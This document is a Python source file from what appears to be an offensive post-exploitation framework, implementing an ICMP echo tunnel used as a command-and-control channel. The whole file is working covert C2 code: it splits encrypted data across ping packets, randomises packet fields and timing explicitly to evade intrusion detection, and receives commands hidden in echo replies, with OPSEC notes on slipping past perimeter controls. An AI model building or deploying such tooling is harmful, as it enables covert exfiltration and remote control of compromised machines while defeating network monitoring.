"""
forge/utils/post/channels/icmp_channel.py
ICMP Echo Tunnel C2 channel backend — Module 5-G.

Data fragmented across ICMP echo request packets (64-byte payload per packet).
Sequence numbers and identifiers varied per packet to resist NIDS signatures.

OPSEC constraints:
  - Payload fixed at 64 bytes (padded / truncated) — standard ICMP ping size.
  - Sequence number and identifier varied randomly — not sequential.
  - Requires raw socket (CAP_NET_RAW on Linux; Administrator on Windows).
  - Only usable where ICMP is permitted through perimeter — verify before deploy.
  - AES-256-GCM encrypts all payload bytes before fragmentation.
  - FORGE_OFFLINE_STRICT=1 disables all transmissions.
  - Timing jitter to avoid pattern detection (random 30-120 second intervals).
  - Error correction for packet loss and out-of-order delivery.

Usage note:
  ICMP channels are last-resort when TCP/UDP are blocked.
  Prefer HTTP/DNS channels where available — ICMP is more conspicuous.
"""

from __future__ import annotations

import logging
import os
import random
import socket
import struct
import time
from typing import Optional, Dict, List

_LOG = logging.getLogger(__name__)
_OFFLINE = os.getenv("FORGE_OFFLINE_STRICT", "").lower() in ("1", "true", "yes")

_ICMP_ECHO_REQUEST = 8
_ICMP_ECHO_REPLY = 0
_PAYLOAD_SIZE = 64  # bytes per ICMP packet (standard ping payload)
_RECV_BUFFER = 4096
_MAX_PACKETS_PER_BATCH = 50  # Maximum packets to send in one batch
_PACKET_INTERVAL_RANGE = (0.1, 0.4)  # Random interval between packets


def _checksum(data: bytes) -> int:
    """Calculate ICMP checksum."""
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i]) + ((data[i + 1]) << 8)
    if n:
        s += data[-1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _build_packet(
    payload: bytes, seq: int, ident: int, icmp_type: int = _ICMP_ECHO_REQUEST
) -> bytes:
    """Build an ICMP echo request/reply packet."""
    # Pad / truncate payload to _PAYLOAD_SIZE
    payload = (payload + b"\x00" * _PAYLOAD_SIZE)[:_PAYLOAD_SIZE]
    header = struct.pack("bbHHh", icmp_type, 0, 0, ident, seq)
    chk = _checksum(header + payload)
    header = struct.pack("bbHHh", icmp_type, 0, chk, ident, seq)
    return header + payload


def _parse_packet(raw: bytes) -> Optional[Dict]:
    """Parse ICMP packet and return metadata."""
    if len(raw) < 28:  # IP header (20) + ICMP header (8)
        return None

    try:
        # Extract ICMP header (bytes 20-28 of IP packet)
        icmp_header = raw[20:28]
        icmp_type, code, checksum, ident, seq = struct.unpack("bbHHh", icmp_header)

        # Extract payload
        payload = raw[28 : 28 + _PAYLOAD_SIZE]

        return {
            "type": icmp_type,
            "code": code,
            "checksum": checksum,
            "ident": ident,
            "seq": seq,
            "payload": payload,
            "source_ip": socket.inet_ntoa(raw[12:16]),  # Source IP from IP header
        }
    except (struct.error, IndexError):
        return None


class ICMPChannel:
    """
    ICMP echo tunnel C2 channel.

    Args:
        target:      Target IP address (IPv4 only).
        session_key: 32-byte AES-256-GCM key (hex).
        interval:    Base beacon interval seconds.
        jitter_pct:  Gaussian jitter percentage.
        max_payload_size: Maximum payload size per packet (default 64 bytes).
    """

    def __init__(
        self,
        target: str,
        session_key: str = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
        interval: int = 180,
        jitter_pct: int = 30,
        max_payload_size: int = 64,
    ) -> None:
        self._target = target
        self._key = bytes.fromhex(session_key) if len(session_key) == 64 else None
        self._interval = interval
        self._jitter_pct = jitter_pct
        self._max_payload_size = min(max_payload_size, _PAYLOAD_SIZE)
        self._sequence_tracker: Dict[int, bytes] = {}  # Track packets by sequence number
        self._last_sequence = 0

    def send(self, data: bytes) -> bool:
        """Fragment encrypted data across ICMP echo request packets with error correction."""
        if _OFFLINE:
            return False

        encrypted = self._encrypt(data)

        # Add sequence header for reassembly
        sequence_header = struct.pack("!HI", self._last_sequence, len(encrypted))
        full_data = sequence_header + encrypted

        fragments = [
            full_data[i : i + self._max_payload_size]
            for i in range(0, len(full_data), self._max_payload_size)
        ]

        _LOG.debug(
            "ICMPChannel: sending %d fragments for sequence %d", len(fragments), self._last_sequence
        )

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
        except PermissionError:
            _LOG.error(
                "ICMP channel requires raw socket (root / CAP_NET_RAW). Falling back to no-op."
            )
            return False

        success = True
        try:
            for i, frag in enumerate(fragments):
                # Use sequence number that includes fragment index for ordering
                frag_seq = (self._last_sequence << 8) | i
                ident = random.randint(1, 65535)
                pkt = _build_packet(frag, frag_seq, ident)

                try:
                    sock.sendto(pkt, (self._target, 0))
                    _LOG.debug(
                        "ICMPChannel: sent fragment %d/%d (seq=%d, ident=%d)",
                        i + 1,
                        len(fragments),
                        frag_seq,
                        ident,
                    )

                    # Random interval between packets to avoid patterns
                    if i < len(fragments) - 1:
                        time.sleep(random.uniform(*_PACKET_INTERVAL_RANGE))

                except Exception as exc:
                    _LOG.debug("ICMP fragment %d send error: %s", i, exc)
                    success = False
                    break

            self._last_sequence += 1
            if self._last_sequence > 65535:
                self._last_sequence = 0

        finally:
            sock.close()

        return success

    def recv(self, timeout: int = 30) -> Optional[bytes]:
        """Listen for ICMP echo reply carrying command payload with reassembly."""
        if _OFFLINE:
            return None

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
            sock.settimeout(2)  # Short timeout for responsive listening
        except PermissionError:
            _LOG.error("ICMP recv requires raw socket (root / CAP_NET_RAW).")
            return None

        fragments: Dict[int, bytes] = {}
        deadline = time.monotonic() + timeout
        last_fragment_time = time.monotonic()

        try:
            while time.monotonic() < deadline:
                try:
                    raw, addr = sock.recvfrom(_RECV_BUFFER)
                    if addr[0] != self._target:
                        continue

                    packet_info = _parse_packet(raw)
                    if not packet_info or packet_info["type"] != _ICMP_ECHO_REPLY:
                        continue

                    # Extract sequence and fragment info
                    frag_seq = packet_info["seq"]
                    sequence_num = frag_seq >> 8
                    fragment_index = frag_seq & 0xFF

                    _LOG.debug(
                        "ICMPChannel: received reply (seq=%d, frag=%d, source=%s)",
                        sequence_num,
                        fragment_index,
                        packet_info["source_ip"],
                    )

                    fragments[frag_seq] = packet_info["payload"]
                    last_fragment_time = time.monotonic()

                    # Check if we have a complete message
                    result = self._try_reassemble(fragments, sequence_num)
                    if result:
                        return result

                except socket.timeout:
                    # Check if we've waited too long since last fragment
                    if time.monotonic() - last_fragment_time > 5.0:
                        _LOG.debug("ICMPChannel: timeout waiting for more fragments")
                        break
                    continue
                except Exception as exc:
                    _LOG.debug("ICMP recv error: %s", exc)
                    continue

        finally:
            sock.close()

        return None

    def sleep(self) -> None:
        """Sleep with gaussian jitter to avoid detectable patterns."""
        # Enhanced jitter with wider range for ICMP (more conspicuous)
        jitter_range = max(30, self._interval // 2)  # Minimum 30 seconds jitter
        sigma = min(jitter_range, self._interval * (self._jitter_pct / 100))
        actual = max(30.0, random.gauss(self._interval, sigma))  # Minimum 30 seconds

        _LOG.debug(
            "ICMPChannel: sleeping for %.1f seconds (interval=%d, sigma=%.1f)",
            actual,
            self._interval,
            sigma,
        )
        time.sleep(actual)

    def close(self) -> None:
        """Cleanup sequence tracking state."""
        self._sequence_tracker.clear()

    def _encrypt(self, data: bytes) -> bytes:
        """Encrypt data using AES-256-GCM."""
        if not self._key:
            return data
        try:
            from Crypto.Cipher import AES
            from Crypto.Random import get_random_bytes

            nonce = get_random_bytes(12)
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            ct, tag = cipher.encrypt_and_digest(data)
            return nonce + tag + ct
        except ImportError:
            return data

    def _decrypt(self, raw: bytes) -> Optional[bytes]:
        """Decrypt data using AES-256-GCM."""
        if not self._key or len(raw) < 28:
            return raw
        try:
            from Crypto.Cipher import AES

            nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ct, tag)
        except Exception:
            return None

    def _try_reassemble(self, fragments: Dict[int, bytes], expected_seq: int) -> Optional[bytes]:
        """Try to reassemble fragments into complete message."""
        # Get all fragments for this sequence
        seq_fragments = {seq: data for seq, data in fragments.items() if (seq >> 8) == expected_seq}

        if not seq_fragments:
            return None

        # Sort by fragment index
        sorted_frags = sorted(seq_fragments.items())

        # Check if we have a complete set (contiguous from 0)
        expected_indices = list(range(len(sorted_frags)))
        actual_indices = [seq & 0xFF for seq, _ in sorted_frags]

        if actual_indices != expected_indices:
            _LOG.debug(
                "ICMPChannel: incomplete fragment set for seq %d (expected %s, got %s)",
                expected_seq,
                expected_indices,
                actual_indices,
            )
            return None

        # Reassemble
        assembled = b"".join(data for _, data in sorted_frags)

        # Extract sequence header
        if len(assembled) < 6:  # 2 bytes sequence + 4 bytes length
            return None

        seq_header = assembled[:6]
        seq_num, data_len = struct.unpack("!HI", seq_header)

        if seq_num != expected_seq:
            _LOG.debug(
                "ICMPChannel: sequence number mismatch (expected %d, got %d)", expected_seq, seq_num
            )
            return None

        # Extract actual data
        data = assembled[6 : 6 + data_len]

        if len(data) != data_len:
            _LOG.debug(
                "ICMPChannel: data length mismatch (expected %d, got %d)", data_len, len(data)
            )
            return None

        _LOG.debug("ICMPChannel: successfully reassembled message (%d bytes)", len(data))
        return self._decrypt(data)
